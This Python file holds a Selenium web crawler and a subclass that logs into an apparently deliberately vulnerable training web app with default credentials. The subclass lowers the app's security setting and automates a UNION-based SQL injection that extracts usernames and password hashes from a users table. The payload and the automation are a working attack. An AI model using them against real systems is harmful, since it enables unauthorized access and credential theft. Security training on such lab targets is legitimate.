import csv
import queue
import re

from bs4 import BeautifulSoup
from collections import deque
from pyvirtualdisplay import Display
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from urllib.parse import urldefrag, urljoin

from exceptions import (
    ImproperlyConfigured,
    EmptyWebPage,
)


class Crawler(object):
    """
    A Crawler that finds documents that have certain 
    characteristics. It was designed to be extendable and
    used in simpler cases.
    It needs a lot of work there is too many edge cases to cover 
    """
    allow_external_urls = False

    def __init__(self, base_url=None, initial_path='', levels=1):
        """Setup and validate arguments to make them available 
        
        Keyword Arguments:
            initial_path {str} -- URL (default: {None})
            base_url {str} -- URL (default: {None})
            levels {int} -- Number of levels to crawl (default: {1})
        """
        if not base_url:
            raise(ImproperlyConfigured('base url'))
        elif not int(levels):
            raise(ValueError(int))

        # Fake display for selenium
        self.display = Display(visible=0, size=(800, 600))
        self.display.start()
        # Add path to your Firefox.
        self.browser = webdriver.Firefox(log_path='/var/log/geckolog.log')
        # The initial_path might change after the setup method 
        self.initial_path = initial_path
        self.base_url = base_url
        # Queue of urls to visit
        self.queue = self.get_queue() 
        # Visited Urls
        self.visited = self.get_visited()
        self.url_regex = self.get_url_regex() 
        self.levels = levels
        self._setup()
        self.broken_urls = self.get_broken_urls()
    
    def get_broken_urls(self):
        return(set())
    
    def get_url_regex(self):
        # Horrible 80 + LINE
        return(re.compile(r'^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?$'))

    def is_relative(self, url):
        return not self.url_regex.match(url)
    
    def get_base_url(self, url):
        # Horrible 80 + LINE 2
        regex = re.compile(r'^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}$')
        _reg = regex.match(url)
        return(_reg.group())

    def get_queue(self):
        return(queue.Queue())

    def get_visited(self):
        return(set())

    def _setup(self):
        """
        Method dedicated to take care of authentication,
        and general setup to start the crawling
        """
        initial_path = self.initial_path
        base_url = self.base_url
        if self.is_relative(initial_path):
            _url = '{}{}'.format(base_url, initial_path)
        self.queue.put((_url, 0))

    def _process_page_object(self, page_object):
        """
        Method dedicated to take care of processing
        a web page content to do secondary effects.
        """
        pass
    
    def get_page_source(self, url):
        try:
            self.browser.get(url)
            return self.browser.page_source
        except Exception as e:
            self.broken_urls.add(url)

    def _get_page_object(self, html):
        if not html:
            raise(EmptyWebPage)
        return BeautifulSoup(html, 'html')
        
    def get_and_process_links(self, page, parent_url, level):
        links = page.find_all('a', href=True)
        for link in links:
            _url = link['href']
            if(self.is_relative(_url)):
                _url = '{}{}'.format(self.get_base_url(parent_url), _url)
            if _url not in self.visited and _url not in self.broken_urls:
                self.queue.put((_url, level + 1))
    
    def run(self):
        try:
            level = 0
            while level <= self.levels:
                item = self.queue.get()
                _url = item[0]
                level = item[1]
                html = self.get_page_source(_url)
                if self.browser.current_url != _url:
                    self.visited.add(self.browser.current_url)
                try:
                    page = self._get_page_object(html)
                except:
                    page = None
                    self.broken_urls.add(_url)
                if page is not None:
                    self.get_and_process_links(page, _url, level)
                    self._process_page_object(page)
                self.visited.add(_url) 
        except queue.Empty:
            self.display.stop()
            return True


class VulnerabilitiesCrawler(Crawler):
    def _setup(self):
        """
        General setup for the image without a database
        """
        _url = self.base_url
        self.browser.get(_url)
        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        username = self.browser.find_element_by_name("username")
        password = self.browser.find_element_by_name("password")
        username.send_keys("admin")
        password.send_keys("password")
        self.browser.find_element_by_xpath("//input[@type='submit']").click()
        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.NAME, "create_db")))
        self.browser.find_element_by_xpath("//input[@type='submit']").click()
        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        username = self.browser.find_element_by_name("username")
        password = self.browser.find_element_by_name("password")
        username.send_keys("admin")
        password.send_keys("password")
        self.browser.find_element_by_xpath("//input[@type='submit']").click()
        WebDriverWait(self.browser, 100).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".menuBlocks")))
        self.browser.get(_url + 'security.php')
        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".menuBlocks")))
        select = Select(self.browser.find_element_by_xpath("//select[@name='security']"))
        select.select_by_visible_text('Low')
        button = self.browser.find_element_by_xpath("//input[@name='seclev_submit']")
        button.click()
        WebDriverWait(self.browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, ".menuBlocks")))
        self.queue.put(_url + 'vulnerabilities/sqli/')

    def run(self):
        _url = self.queue.get()
        self.browser.get(_url)
        # start test
        input = self.browser.find_element_by_xpath("//input[@name='id']")
        query = r"%' and 1=0 union select null, concat(user,':',password) from users #"
        input.send_keys(query)
        button = self.browser.find_element_by_xpath("//input[@name='Submit']")
        button.click()
        # return username and password
        info = self.browser.find_element_by_xpath("//*[@id='main_body']/div/div/pre[1]")
        return(info.get_attribute('innerHTML'))



